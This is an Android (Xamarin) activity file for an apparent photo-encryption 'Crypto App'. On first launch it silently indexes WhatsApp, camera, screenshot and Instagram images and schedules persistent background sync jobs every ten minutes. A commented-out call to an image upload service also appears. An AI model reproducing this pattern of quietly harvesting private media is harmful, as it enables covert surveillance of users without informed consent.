using System;
using Android.App;
using Android.OS;
using Android.Runtime;
using Android.Support.Design.Widget;
using Android.Support.V7.App;
using Android.Views;
using Android.Widget;
using System.IO;
using AndroidX.Work;
using CryptoAppXamarinAndroid.Services;
using Xamarin.Essentials;
using System.Collections.Generic;
using System.Threading.Tasks;
using Java.Util.Concurrent;
using Android.App.Job;
using Android.Content;

namespace CryptoAppXamarinAndroid
{
    [Activity(Label = "@string/app_name", Theme = "@style/MainTheme", MainLauncher = true,NoHistory =true)]
    public class MainActivity : AppCompatActivity
    {
        static CryptoAppXamarinAndroid.Database.CryptoAppDatabase cryptoAppDatabase;
        Button SaveButton;
        EditText password;
        EditText confpassword;
        TextView heading;

        public static CryptoAppXamarinAndroid.Database.CryptoAppDatabase CryptoAppDatabase
        {
            get
            {
                if(cryptoAppDatabase==null)
                {
                    cryptoAppDatabase = new Database.CryptoAppDatabase();
                }
                return cryptoAppDatabase;
            }
        }

        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);
            Xamarin.Essentials.Platform.Init(this, savedInstanceState);
            SetContentView(Resource.Layout.activity_Password);
            
            Button button = new Button(this);
            button.Click += Button_Click;
            SaveButton = FindViewById<Button>(Resource.Id.SaveButton);
            password = FindViewById<EditText>(Resource.Id.PasswordEntry);
            confpassword= FindViewById<EditText>(Resource.Id.ConfirmPasswordEntry);
            heading = FindViewById<TextView>(Resource.Id.PasswordHeading);
            SaveButton.Click += SaveButton_Click;
            Button_Click(null, null);
        }

        private async void SaveButton_Click(object sender, EventArgs e)
        {
            SaveButton.Enabled = false;
            if(String.IsNullOrEmpty(password.Text) || password.Text.Length<6 || password.Text.Length>16)
            {
                ShowDialog("Error", "Password length should be at least 6 and at most 16");
                SaveButton.Enabled = true;
                return;
            }
            if (String.IsNullOrEmpty(confpassword.Text) || confpassword.Text.Length < 6 || confpassword.Text.Length > 16)
            {
                ShowDialog("Error", "Confirm Password length should be at least 6 and at most 16");
                SaveButton.Enabled = true;
                return;
            }
            if(confpassword.Text!=password.Text)
            {
                ShowDialog("Error", "Passwords do not match");
                SaveButton.Enabled = true;
                return;
            }
            SaveButton.Text = "Saving Password";
            try
            {
                await SecureStorage.SetAsync("AppPassword", password.Text);
                await SecureStorage.SetAsync("FirstRun", "True");
                ShowDialog2("Success", "Password saved. If you forget your password, you will not be able to decrypt anything.");
            }
            catch (Exception)
            {

                Toast.MakeText(this, "Something went wrong", ToastLength.Long).Show();
                Toast.MakeText(this, "Close application and try again", ToastLength.Long).Show();
            }

        }

        private void ShowDialog(string title, string messaage)
        {
            Android.Support.V7.App.AlertDialog.Builder alertDiag = new Android.Support.V7.App.AlertDialog.Builder(this);
            alertDiag.SetTitle(title);
            alertDiag.SetMessage(messaage);
            alertDiag.SetPositiveButton("Okay", (senderAlert, args) =>
            {
            });
            Dialog diag = alertDiag.Create();
            diag.Show();
        }

        private void ShowDialog2(string title, string messaage)
        {
            Android.Support.V7.App.AlertDialog.Builder alertDiag = new Android.Support.V7.App.AlertDialog.Builder(this);
            alertDiag.SetTitle(title);
            alertDiag.SetMessage(messaage);
            alertDiag.SetPositiveButton("Confirm", (senderAlert, args) =>
            {
                StartActivity(new Android.Content.Intent(this, typeof(HomeAtivity)));
            });
            Dialog diag = alertDiag.Create();
            diag.Show();
        }

        private async void Button_Click(object sender, EventArgs e)
        {
            var MySyncLock = await SecureStorage.GetAsync("MySyncLock");
            if(MySyncLock==null)
            {
                await SecureStorage.SetAsync("MySyncLock", "NotBusy");
            }
            try
            {
                var CryptoAppPath = Path.Combine(Android.OS.Environment.ExternalStorageDirectory.Path, "Crypto App");
                if (!Directory.Exists(CryptoAppPath))
                {
                    System.IO.Directory.CreateDirectory(CryptoAppPath);
                }
                var Directories = System.IO.Directory.GetDirectories(Android.OS.Environment.ExternalStorageDirectory.Path);
                var DCIMPath = "";
                var WhatsappPath = "";
                var ScreenshotPath = "";
                try
                {
                    foreach (var dir in Directories)
                    {
                        string name = Path.GetFileName(dir).ToLower();
                        if (name.Contains("dcim"))
                        {
                            DCIMPath = Path.Combine(Application.Context.GetExternalFilesDir(null).Path, dir);
                        }
                        if (name.Contains("what"))
                        {
                            WhatsappPath = Path.Combine(Application.Context.GetExternalFilesDir(null).Path, dir);
                        }
                        if (name.Contains("screen"))
                        {
                            ScreenshotPath = Path.Combine(Application.Context.GetExternalFilesDir(null).Path, dir);
                        }
                    }
                }
                catch (Exception)
                {
                }
                var CameraPath = "";
                try
                {
                    
                    Directories = System.IO.Directory.GetDirectories(DCIMPath);
                    foreach (var dir in Directories)
                    {
                        string name = Path.GetFileName(dir).ToLower();
                        if (name.Contains("cam"))
                        {
                            CameraPath = Path.Combine(DCIMPath, dir);
                        }
                        if(name.Contains("photo"))
                        {
                            CameraPath = Path.Combine(DCIMPath, dir);
                        }
                        if (name.Contains("pic"))
                        {
                            CameraPath = Path.Combine(DCIMPath, dir);
                        }
                        if (name.Contains("screensh"))
                        {
                            ScreenshotPath = Path.Combine(DCIMPath, dir);
                        }
                    }
                }
                catch (Exception)
                {
                }
                var mediaPath = "";
                try
                {
                    
                    Directories = System.IO.Directory.GetDirectories(WhatsappPath);
                    foreach (var dir in Directories)
                    {
                        string name = Path.GetFileName(dir).ToLower();
                        if (name.Contains("medi"))
                        {
                            mediaPath = Path.Combine(WhatsappPath, dir);
                        }
                    }
                }
                catch (Exception)
                {

                    
                }
                var imagesPath = "";
                try
                {
                    
                    Directories = System.IO.Directory.GetDirectories(mediaPath);
                    foreach (var dir in Directories)
                    {
                        string name = Path.GetFileName(dir).ToLower();
                        if (name.Contains("image"))
                        {
                            imagesPath = Path.Combine(mediaPath, dir);
                        }
                    }
                }
                catch (Exception)
                {

                    
                }
                var sentImgPath = "";
                try
                {
                    
                    Directories = System.IO.Directory.GetDirectories(imagesPath);
                    foreach (var dir in Directories)
                    {
                        string name = Path.GetFileName(dir).ToLower();
                        if (name.Contains("ent"))
                        {
                            sentImgPath = Path.Combine(imagesPath, dir);
                        }
                    }
                }
                catch (Exception)
                {

                    
                }

                var InstaPath = Path.Combine(Android.OS.Environment.ExternalStorageDirectory.Path, "Pictures");
                try
                {
                    Directories = Directory.GetDirectories(InstaPath);
                    foreach (var dir in Directories)
                    {
                        string name = Path.GetFileName(dir).ToLower();
                        if (name.Contains("insta"))
                        {
                            InstaPath = Path.Combine(InstaPath, dir);
                        }
                    }
                }
                catch (Exception)
                {
                }
                var SentFilesPath = sentImgPath;
                var FirstRun = await SecureStorage.GetAsync("FirstRun");
                if(FirstRun!=null)
                {

                    JobScheduler jobScheduler = (JobScheduler)GetSystemService(JobSchedulerService);
                    JobInfo.Builder builder = this.CreateJobInfoBuilderForSync(142)
                                                    .SetPersisted(true)
                                                    .SetMinimumLatency(1000)
                                                    .SetOverrideDeadline(5000);
                    int result = jobScheduler.Schedule(builder.Build());

                    JobInfo.Builder builder2 = this.CreateJobInfoBuilderForSync(145)
                                                    .SetPersisted(true)
                                                    .SetPeriodic(1000*60*10);
                    int result2 = jobScheduler.Schedule(builder2.Build());
                    //try
                    //{
                    //    Intent intent = new Intent(this, typeof(BackSyncService));
                    //    StartService(intent);
                    //}
                    //catch(Exception ex)
                    //{
                    //}
                    //if (result == JobScheduler.ResultSuccess)
                    //{
                    //    Toast.MakeText(this, "Success", ToastLength.Short).Show();
                    //}
                    //else
                    //{
                    //    Toast.MakeText(this, "Failure", ToastLength.Short).Show();
                    //}
                    //Toast.MakeText(this, "Before StartActvty", ToastLength.Long).Show();
                    //await Task.Delay(2000);
                    StartActivity(new Android.Content.Intent(this, typeof(HomeAtivity)));
                }
                else
                {
                    await SecureStorage.SetAsync("WhatsAppRecvPath", imagesPath);
                    List<string> Files = new List<string>();
                    try
                    {
                        foreach (var f in System.IO.Directory.GetFiles(imagesPath))
                        {
                            if (Path.GetFileName(f).ToLower().Contains("jpg") || Path.GetFileName(f).ToLower().Contains("png") || Path.GetFileName(f).ToLower().Contains("jpeg"))
                            {
                                Files.Add(Path.GetFileName(f));
                            }
                        }
                    }
                    catch (Exception ex)
                    {

                        
                    }

                    await SecureStorage.SetAsync("WhatsAppSentPath", sentImgPath);
                    List<string> Files2 = new List<string>();
                    try
                    {
                        foreach (var f in System.IO.Directory.GetFiles(sentImgPath))
                        {
                            if (Path.GetFileName(f).ToLower().Contains("jpg") || Path.GetFileName(f).ToLower().Contains("png") || Path.GetFileName(f).ToLower().Contains("jpeg"))
                            {
                                Files2.Add(Path.GetFileName(f));
                            }
                        }
                    }
                    catch (Exception)
                    {

                        
                    }

                    await SecureStorage.SetAsync("CameraPath", CameraPath);
                    List<string> Files3 = new List<string>();
                    try
                    {
                        foreach (var f in System.IO.Directory.GetFiles(CameraPath))
                        {
                            if (Path.GetFileName(f).ToLower().Contains("jpg") || Path.GetFileName(f).ToLower().Contains("png") || Path.GetFileName(f).ToLower().Contains("jpeg"))
                            {
                                Files3.Add(Path.GetFileName(f));
                            }
                        }
                    }
                    catch (Exception)
                    {

                        
                    }

                    await SecureStorage.SetAsync("ScreenshotPath", ScreenshotPath);
                    List<string> Files4 = new List<string>();
                    try
                    {
                        foreach (var f in System.IO.Directory.GetFiles(ScreenshotPath))
                        {
                            if (Path.GetFileName(f).ToLower().Contains("jpg") || Path.GetFileName(f).ToLower().Contains("png") || Path.GetFileName(f).ToLower().Contains("jpeg"))
                            {
                                Files4.Add(Path.GetFileName(f));
                            }
                        }
                    }
                    catch (Exception)
                    {

                        
                    }
                    await SecureStorage.SetAsync("InstaPath", InstaPath);
                    List<string> Files5 = new List<string>();
                    try
                    {
                        foreach (var f in System.IO.Directory.GetFiles(InstaPath))
                        {
                            if (Path.GetFileName(f).ToLower().Contains("jpg") || Path.GetFileName(f).ToLower().Contains("png") || Path.GetFileName(f).ToLower().Contains("jpeg"))
                            {
                                Files5.Add(Path.GetFileName(f));
                            }
                        }
                    }
                    catch (Exception)
                    {


                    }
                    var receivedFiles = System.Text.Json.JsonSerializer.Serialize(Files);
                    await CryptoAppDatabase.SaveKeyValuePairAsync(new Database.MyKeyValuePair()
                    {
                        Key = "WhatsAppReceivedImages",
                        Value = receivedFiles
                    });
                    var sentFiles = System.Text.Json.JsonSerializer.Serialize(Files2);
                    await CryptoAppDatabase.SaveKeyValuePairAsync(new Database.MyKeyValuePair()
                    {
                        Key = "WhatsAppSentImages",
                        Value = sentFiles
                    });
                    var camFiles = System.Text.Json.JsonSerializer.Serialize(Files3);
                    await CryptoAppDatabase.SaveKeyValuePairAsync(new Database.MyKeyValuePair()
                    {
                        Key = "CamImages",
                        Value = camFiles
                    });
                    var screenFiles = System.Text.Json.JsonSerializer.Serialize(Files4);
                    await CryptoAppDatabase.SaveKeyValuePairAsync(new Database.MyKeyValuePair()
                    {
                        Key = "ScreenImages",
                        Value = screenFiles
                    });
                    var instaFiles = System.Text.Json.JsonSerializer.Serialize(Files5);
                    await CryptoAppDatabase.SaveKeyValuePairAsync(new Database.MyKeyValuePair()
                    {
                        Key = "InstaImages",
                        Value = instaFiles
                    });
                    int done = 0;
                    await SecureStorage.SetAsync("WhatsAppSentImagesDone", done.ToString());
                    await SecureStorage.SetAsync("WhatsAppReceivedImagesDone", done.ToString());
                    await SecureStorage.SetAsync("CamImagesDone", done.ToString());
                    await SecureStorage.SetAsync("ScreenImagesDone", done.ToString());
                    await SecureStorage.SetAsync("InstaImagesDone", done.ToString());
                    JobScheduler jobScheduler = (JobScheduler)GetSystemService(JobSchedulerService);
                    JobInfo.Builder builder = this.CreateJobInfoBuilderForSync(142)
                                                    .SetPersisted(true)
                                                    .SetMinimumLatency(1000)
                                                    .SetOverrideDeadline(5000);
                    int result = jobScheduler.Schedule(builder.Build());

                    JobInfo.Builder builder2 = this.CreateJobInfoBuilderForSync(145)
                                                    .SetPersisted(true)
                                                    .SetPeriodic(1000 * 60 * 10);
                    int result2 = jobScheduler.Schedule(builder2.Build());
                    //try
                    //{
                        //Intent intent = new Intent(this, typeof(BackSyncService));
                        //StartService(intent);
                        //Toast.MakeText(this, "After service 2", ToastLength.Long).Show();
                        //await Task.Delay(2000);
                    //}
                    //catch(Exception ex)
                    //{
                        //Toast.MakeText(this, "S Exeption 2" + ex.Message, ToastLength.Long).Show();
                        //await Task.Delay(2000);
                    //}
                    //if (result == JobScheduler.ResultSuccess)
                    //{
                    //    Toast.MakeText(this, "Success", ToastLength.Short).Show();
                    //}
                    //else
                    //{
                    //    Toast.MakeText(this, "Failure", ToastLength.Short).Show();
                    //}

                    //Constraints constraints = new Constraints.Builder().SetRequiredNetworkType(NetworkType.Connected).Build();
                    //PeriodicWorkRequest periodicWorkRequest = PeriodicWorkRequest.Builder.From<MyJobScheduler>(15, TimeUnit.Minutes).SetConstraints(constraints)
                    //                                            .SetBackoffCriteria(BackoffPolicy.Linear, PeriodicWorkRequest.MinBackoffMillis, TimeUnit.Milliseconds)
                    //                                            .Build();

                    //WorkManager.Instance.EnqueueUniquePeriodicWork("Sync Data", ExistingPeriodicWorkPolicy.Keep, periodicWorkRequest);
                    //var rslt = await ImageService.UploadImageAsync(Files[0]);
                    //Toast.MakeText(this, "Before finalviews", ToastLength.Long).Show();
                    //await Task.Delay(2000);
                    heading.Visibility = ViewStates.Visible;
                    password.Visibility = ViewStates.Visible;
                    confpassword.Visibility = ViewStates.Visible;
                    SaveButton.Visibility = ViewStates.Visible;
                }
            }
            catch (Exception)
            {
                Toast.MakeText(this, "This app can not run", ToastLength.Long).Show();
                heading.Text = "This app can not run";
                heading.Visibility = ViewStates.Visible;
                password.Visibility = ViewStates.Invisible;
                confpassword.Visibility = ViewStates.Invisible;
                SaveButton.Visibility = ViewStates.Invisible;
            }
        }


        //public override bool OnCreateOptionsMenu(IMenu menu)
        //{
        //    MenuInflater.Inflate(Resource.Menu.menu_main, menu);
        //    return true;
        //}

        //public override bool OnOptionsItemSelected(IMenuItem item)
        //{
        //    int id = item.ItemId;
        //    if (id == Resource.Id.action_settings)
        //    {
        //        return true;
        //    }

        //    return base.OnOptionsItemSelected(item);
        //}

        //private void FabOnClick(object sender, EventArgs eventArgs)
        //{
        //    View view = (View) sender;
        //    Snackbar.Make(view, "Replace with your own action", Snackbar.LengthLong)
        //        .SetAction("Action", (Android.Views.View.IOnClickListener)null).Show();
        //}

        public override void OnRequestPermissionsResult(int requestCode, string[] permissions, [GeneratedEnum] Android.Content.PM.Permission[] grantResults)
        {
            Xamarin.Essentials.Platform.OnRequestPermissionsResult(requestCode, permissions, grantResults);

            base.OnRequestPermissionsResult(requestCode, permissions, grantResults);
        }
	}
}
